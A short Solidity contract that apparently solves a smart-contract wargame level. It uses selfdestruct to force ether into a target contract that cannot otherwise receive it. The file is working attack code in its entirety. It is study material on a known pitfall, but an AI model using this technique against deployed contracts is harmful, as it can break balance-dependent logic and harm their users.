// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IForce {}

contract AttackForce {
    IForce force;

    constructor(IForce _force) public{
        force = _force;
    }

    function deposit() payable public {}

    function attack() public {
        selfdestruct(payable(address(force)));
    }
}